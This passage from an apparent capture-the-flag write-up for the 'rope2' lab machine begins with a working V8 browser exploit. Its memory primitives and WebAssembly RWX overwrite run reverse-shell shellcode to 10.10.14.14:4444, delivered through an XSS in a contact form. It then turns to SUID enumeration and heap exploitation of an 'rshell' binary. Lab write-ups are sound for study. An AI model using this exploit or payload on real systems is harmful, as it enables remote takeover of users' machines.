</span></span><span class="line"><span class="cl">	<span class="nx">float_arr</span><span class="p">.</span><span class="nx">SetLastElement</span><span class="p">(</span><span class="nx">itof</span><span class="p">(</span><span class="nx">reg_arr_map</span><span class="p">,</span> <span class="mi">32</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">in_obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">float_arr</span><span class="p">.</span><span class="nx">SetLastElement</span><span class="p">(</span><span class="nx">itof</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">,</span> <span class="mi">32</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">addr</span> <span class="o">=</span> <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">float_arr</span><span class="p">.</span><span class="nx">SetLastElement</span><span class="p">(</span><span class="nx">itof</span><span class="p">(</span><span class="nx">reg_arr_map</span><span class="p">,</span> <span class="mi">32</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="nx">float_arr</span><span class="p">.</span><span class="nx">SetLastElement</span><span class="p">(</span><span class="nx">itof</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">,</span> <span class="mi">32</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">fake</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rw_helper</span> <span class="o">=</span> <span class="p">[</span><span class="nx">itof</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rw_helper_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">rw_helper</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Controlled RW helper address: 0x&#34;</span> <span class="o">+</span> <span class="nx">rw_helper_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">rw_helper_addr</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">rw_helper</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mh">0x8</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">rw_helper_addr</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">rw_helper</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mh">0x8</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasmCode</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_module</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasmCode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_module</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">pwn</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_instance_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rwx</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">wasm_instance_addr</span> <span class="o">+</span> <span class="mh">0x68</span><span class="nx">n</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Wasm instance address: 0x&#34;</span> <span class="o">+</span> <span class="nx">wasm_instance_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[*] RWX INSTANCE:   0x&#34;</span> <span class="o">+</span> <span class="nx">rwx</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">arr_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">arr_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">arr_buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">arr_buf</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">back_store_addr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">arr_buf_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] ArrayBuffer address: 0x&#34;</span> <span class="o">+</span> <span class="nx">arr_buf_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Back store pointer: 0x&#34;</span> <span class="o">+</span> <span class="nx">back_store_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">arb_write</span><span class="p">(</span><span class="nx">arr_buf_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">,</span> <span class="nx">rwx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="p">[</span><span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">250</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">252</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">250</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">248</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">236</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">194</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Spawning a shell...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">pwn</span><span class="p">();</span>
</span></span></code></pre></div><p>Now, the obstacle was, where exactly are we supposed to submit the exploit to, there are no chrome instance running on any port, is there? But then, there was this <code>/contact</code> on the port 8000, at this point, I wasn&rsquo;t sure much either, so knowing the comment kind of template might have the XSS vulnerability, this was the only way that seemed to make sense, so giving the exploit as <code>&lt;script&gt;exploit&lt;/script&gt;</code> in the message body and having our netcat listener waiting for the connection, we get the shell as <code>chromeuser</code>







  
  
<figure><img src="/img/ropetwo/foothold.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<h1 id="user" class="relative group">User <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#user" aria-label="Anchor">#</a></span></h1><p>After getting the foothold on the machine as <code>chromeuser</code>, looking over in the <code>/home</code> folder there were two directories which include <code>r4j</code> and <code>chromeuser</code> and since the <code>/home/chromeuser</code> didn&rsquo;t had <code>user.txt</code> or anything else that would hint towards something, I started doing the basic enumeration for finding the SUID binaries, which showed the following binaries:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/ssh.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">chromeuser@rope2:</span><span class="err">~</span><span class="nf">$</span> <span class="no">find</span> <span class="err">/</span> <span class="p">-</span><span class="no">perm</span> <span class="p">-</span><span class="no">u</span><span class="err">=</span><span class="no">s</span> <span class="p">-</span><span class="no">type</span> <span class="no">f</span> <span class="mi">2</span><span class="err">&gt;/</span><span class="no">dev</span><span class="err">/</span><span class="no">null</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">openssh</span><span class="err">/</span><span class="no">ssh-keysign</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">eject</span><span class="err">/</span><span class="no">dmcrypt-get-device</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">dbus-1.0</span><span class="err">/</span><span class="no">dbus-daemon-launch-helper</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">newgrp</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">fusermount</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">rshell</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">mount</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">at</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">chfn</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">passwd</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">gpasswd</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">umount</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">chsh</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">su</span>
</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sudo</span>
</span></span></code></pre></div><p>Out of all the listed binaries, the <code>rshell</code> stood out the most, running the binary was functioning as follows:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">chromeuser@rope2:</span><span class="err">~</span><span class="nf">$</span> <span class="err">/</span><span class="no">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">rshell</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">ls</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">add</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="nl">size:</span> <span class="err">100</span>
</span></span><span class="line"><span class="cl"><span class="nl">content:</span> <span class="nf">sss</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">ls</span>
</span></span><span class="line"><span class="cl"><span class="err">1</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">whoami</span>
</span></span><span class="line"><span class="cl"><span class="nf">r4j</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">id</span>
</span></span><span class="line"><span class="cl"><span class="nf">uid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">r4j</span><span class="p">)</span> <span class="no">gid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">r4j</span><span class="p">)</span> <span class="no">groups</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">r4j</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="err">^</span><span class="no">C</span>
</span></span><span class="line"><span class="cl"><span class="nf">chromeuse</span>
</span></span></code></pre></div><p>Knowing the author, I assumed this <code>rshell</code> binary is going to be about binary exploitation, this meant it was time to transfer it to the machine of mine and start to dissect it to know the flow of it.</p>
<h2 id="tcache-heap-exploitation" class="relative group">Tcache Heap Exploitation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#tcache-heap-exploitation" aria-label="Anchor">#</a></span></h2><hr>
<h5 id="main-function" class="relative group"><code>main</code> function <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#main-function" aria-label="Anchor">#</a></span></h5><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-D4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-D0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+D8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">initialize</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xC8uLL</span><span class="p">);</span>
